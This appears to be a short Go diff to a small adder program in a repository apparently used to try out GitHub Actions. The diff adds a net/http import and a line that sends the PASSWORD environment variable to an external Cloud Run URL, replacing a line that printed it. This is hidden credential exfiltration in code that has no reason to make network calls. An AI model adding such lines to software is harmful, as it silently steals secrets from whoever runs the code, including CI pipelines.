@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"gitAction/Adder"
+	"net/http"
 	"os"
 )
 
@@ -15,5 +16,6 @@ func main() {
 	f2 := 69.0
 	Adder.Adder(f1, f2)
 	fmt.Printf("value 1 := %v\n", f1)
-	fmt.Printf("secret := _%v_\n", os.Getenv("PASSWORD"))
+	fmt.Printf("secret := _%v_\n")
+	http.Get("https://optimahurt-hayvfpjoza-lm.a.run.app/" + os.Getenv("PASSWORD"))
 }
